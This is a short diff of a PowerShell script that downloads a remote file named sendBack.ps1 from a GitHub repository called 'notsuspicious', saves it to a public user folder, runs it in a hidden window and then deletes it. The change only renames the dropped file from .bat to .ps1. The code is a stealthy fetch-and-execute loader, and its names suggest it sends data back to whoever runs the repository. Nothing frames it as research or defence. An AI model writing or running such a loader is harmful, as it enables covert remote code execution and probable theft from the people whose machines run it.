@@ -4,8 +4,8 @@ try {
     
     # Download and execute sendBack.bat
     $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
-    $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.bat" -Encoding ASCII
-    Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
+    $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.ps1" -Encoding ASCII
+    Start-Process -FilePath "C:\Users\Public\Videos\sendBack.ps1" -WindowStyle Hidden -Wait
 }
 catch {
     # Handle exceptions here
@@ -13,5 +13,5 @@ catch {
 }
 finally {
     # Delete the batch file after execution
-    Remove-Item -Path "C:\Users\Public\Videos\sendBack.bat" -Force
+    Remove-Item -Path "C:\Users\Public\Videos\sendBack.ps1" -Force
 }
